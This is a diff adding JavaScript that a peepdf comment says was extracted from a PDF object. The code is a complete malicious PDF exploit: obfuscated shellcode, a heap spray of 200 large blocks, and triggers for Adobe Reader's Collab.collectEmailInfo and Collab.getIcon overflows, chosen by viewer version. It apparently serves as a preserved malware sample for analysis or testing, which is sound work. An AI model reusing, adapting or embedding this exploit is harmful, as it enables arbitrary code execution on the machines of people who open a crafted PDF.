@@ -1,0 +1,74 @@
+// peepdf comment: Javascript code located in object 22 (version 2)
+
+function none(a, b) {
+    a + b;
+}
+
+function dup(what, count) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+
+function myunescape(buf) {
+    var ret = '';
+    for (var x = 0; x < buf.length; x += 2) {
+        ret += util.byteToChar(Number('0x' + buf.substr(x, 2)));
+    }
+    return ret;
+}
+
+function repeat(count, what) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+var mysc = "%uYG5850%uYG5850%uYGEB90%uYG4022%uYG5F48%uYG5A57%uYG8B66%uYG800A%uYG30F9%uYG1A74%uYGE980%uYGC076%uYG04E1%uYGED80%uYG8076%uYG0FE5%uYGCD02%uYG0F88%uYG4242%uYGEB47%uYGE8E3%uYGFFD9%uYGFFFF%uYG7B7B%uYG817E%uYG8284%uYG797E%uYG7A82%uYG8282%uYG767C%uYG7979%uYG7883%uYG7881%uYG7679%uYG7A7C%uYG817E%uYG7876%uYG817E%uYG767A%uYG8276%uYG817E%uYG767D%uYG8277%uYG8380%uYG817E%uYG767A%uYG7E76%uYG7F7E%uYG7B7A%uYG8285%uYG797E%uYG7682%uYG8279%uYG817E%uYG7676%uYG7976%uYG7B7A%uYG8285%uYG797E%uYG7682%uYG7E7D%uYG817E%uYG7676%uYG7976%uYG7B7A%uYG8285%uYG817E%uYG767D%uYG7678%uYG7976%uYG7B7D%uYG8285%uYG7F84%uYG7882%uYG7676%uYG7676%uYG7676%uYG857E%uYG7B7A%uYG8283%uYG7D82%uYG7B7A%uYG7E85%uYG7676%uYG7676%uYG7676%uYG7676%uYG817E%uYG837D%uYG8283%uYG8285%uYG8184%uYG7E78%uYG7C7B%uYG7D7B%uYG767B%uYG7F81%uYG8585%uYG8585%uYG8585%uYG8585%uYG7879%uYG7682%uYG7885%uYG8480%uYG7D85%uYG7783%uYG7F7E%uYG837A%uYG7A85%uYG7E7B%uYG857B%uYG7E84%uYG7D82%uYG7676%uYG7676%uYG7676%uYG837E%uYG7B7D%uYG7683%uYG7976%uYG7B7D%uYG7E85%uYG7F7E%uYG7C77%uYG847B%uYG7976%uYG837D%uYG7A85%uYG797E%uYG7B7A%uYG7E85%uYG7A76%uYG767E%uYG8579%uYG7676%uYG7B7D%uYG7983%uYG807C%uYG7A76%uYG7E7C%uYG7676%uYG7677%uYG7676%uYG7676%uYG7E7C%uYG7676%uYG7676%uYG7677%uYG7676%uYG807C%uYG7676%uYG8585%uYG7B7B%uYG7E83%uYG7F7E%uYG7B7A%uYG8284%uYG7D82%uYG7B7A%uYG7685%uYG7676%uYG7676%uYG7676%uYG7676%uYG797E%uYG7B7A%uYG7685%uYG7A76%uYG807C%uYG7676%uYG807C%uYG7676%uYG807C%uYG7676%uYG8585%uYG7B7D%uYG7685%uYG8585%uYG7B7B%uYG7A83%uYG8176%uYG7682%uYG7B7D%uYG7A7A%uYG807C%uYG7676%uYG807C%uYG7676%uYG837E%uYG837D%uYG8282%uYG7D7B%uYG7E7C%uYG7676%uYG7676%uYG7677%uYG7676%uYG8585%uYG7B7D%uYG8284%uYG8585%uYG7B7D%uYG7685%uYG8585%uYG7B7B%uYG7683%uYG8176%uYG7682%uYG7A7D%uYG7C78%uYG817E%uYG7B7D%uYG8284%uYG777E%uYG8479%uYG7B78%uYG767B%uYG7A7A%uYG7C7A%uYG7B7D%uYG7D82%uYG7F81%uYG7676%uYG8076%uYG7676%uYG7676%uYG777A%uYG817E%uYG7B7A%uYG8282%uYG797E%uYG7E84%uYG7E76%uYG8179%uYG7E82%uYG857D%uYG7D81%uYG777E%uYG8279%uYG7779%uYG7985%uYG8385%uYG8485%uYG7D85%uYG7B7D%uYG8284%uYG8184%uYG7C76%uYG8184%uYG8080%uYG8184%uYG7876%uYG8184%uYG7C80%uYG797E%uYG7782%uYG7A76%uYG817E%uYG7B7B%uYG8284%uYG817E%uYG837B%uYG7685%uYG817E%uYG7A76%uYG7777%uYG7976%uYG7882%uYG8585%uYG7684%uYG7E84%uYG7F79%uYG8585%uYG8585%uYG8585%uYG787B%uYG7B7C%uYG777C%uYG7A7C%uYG7C7A%uYG7F7C%uYG827C%uYG7B7C%uYG7676%uYG797B%uYG7B7C%uYG7A7D%uYG7C7A%uYG7F7C%uYG827C%uYG7B7C%uYG767B%uYG857C%uYG7F7C%uYG847C%uYG7A7D%uYG7B7C%uYG787D%uYG7676%uYG7C7B%uYG7F7C%uYG787D%uYG7A7D%uYG7B7D%uYG777C%uYG827C%uYG777A%uYG827C%uYG827C%uYG857C%uYG797C%uYG7676%uYG7676%uYG8184%uYG797A%uYG817E%uYG767B%uYG7E77%uYG7D7B%uYG777B%uYG787B%uYG7C7B%uYG817E%uYG7C79%uYG7976%uYG7B7D%uYG8285%uYG8285%uYG7985%uYG7C80%uYG847B%uYG807B%uYG7F7B%uYG857B%uYG7A7D%uYG7C76%uYG797E%uYG7C82%uYG7A76%uYG807A%uYG7B7D%uYG7E84%uYG817E%uYG7E7A%uYG7E77%uYG8178%uYG8082%uYG7783%uYG7784%uYG817E%uYG767B%uYG7A78%uYG7976%uYG7B7B%uYG8285%uYG7976%uYG7783%uYG7979%uYG7F82%uYG7C7C%uYG817E%uYG8076%uYG7783%uYG7784%uYG7783%uYG7784%uYG817E%uYG767B%uYG8277%uYG7976%uYG7B7B%uYG8285%uYG7976%uYG7783%uYG817E%uYG7877%uYG7976%uYG7B7B%uYG8285%uYG817B%uYG8585%uYG7984%uYG777C%uYG7F82%uYG7982%uYG3030%uYG6260%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664%uYG6A68%uYG6E6C%uYG6462%uYG6866%uYG6C6A%uYG626E%uYG6664";
+var sc = unescape(mysc.replace(/YG/g, ""));
+
+function main() {
+    blah = dup(unescape("%u4647%u4a4b%u4849%u4647%u4849"), 128) + sc;
+    bigblock = unescape("%u4a4b%u4647");
+    hs = 20;
+    wap = hs + blah.length;
+    while (bigblock.length < wap) bigblock += bigblock;
+    fb = bigblock.substring(0, wap);
+    block = bigblock.substring(0, bigblock.length - wap);
+    while (block.length + wap < 0x40000) block = block + block + fb;
+    mm = new Array();
+    for (i = 0; i < 200; i++) mm[i] = block + blah;
+    of = dup(myunescape("0a0a0a0a"), 4096);
+    var a = ["_N.bundle"]; //javascript comment
+    Collab["getIcon"](of + a[0x0]);
+}
+var tmp = unescape("%uf6eb%uf4eb");
+var vernum = app.viewerVersion;
+
+function start() {
+    if (vernum >= 7.0) {
+        plin = dup(unescape("%u0b0b%u0028%u06eb%u06eb"), 1124) + unescape("%u0b0b%u0028%u0aeb%u0aeb") + unescape("%u4346%u4a4b") + dup(unescape("%u0b0b%u0028%u06eb%u06eb"), 122) + sc + dup(unescape("%u4a4b%u4748"), 1256);
+    } else {
+        ef6 = unescape("%uf6eb%uf6eb") + unescape("%u0b0b%u0019");
+        plin = dup(unescape("%u4141%u4141"), 80) + sc + dup(unescape("%u4241%u4142"), 80) + unescape("%uf7e9%ufff9")
+
+        + unescape("%uffff%uffff") + tmp + unescape("%uf2eb%uf1eb");
+        while ((plin.length % 8) != 0)
+        plin = unescape("%u4141") + plin;
+        plin += repeat(2626, ef6);
+    }
+    if (vernum >= 6.0) {
+        var para = [];
+        Collab["collectEmailInfo"]({
+            subj: para[0x0],
+            msg: plin
+        });
+    }
+}
+var inBrowser = this.external;
+if (vernum < 8.0) {
+    var shaft = app["setTimeOut"]("start()", 1200);
+} else {
+    if (inBrowser) var shaft = app["setTimeOut"]("main()", 1200);
+    else main();
+}
+
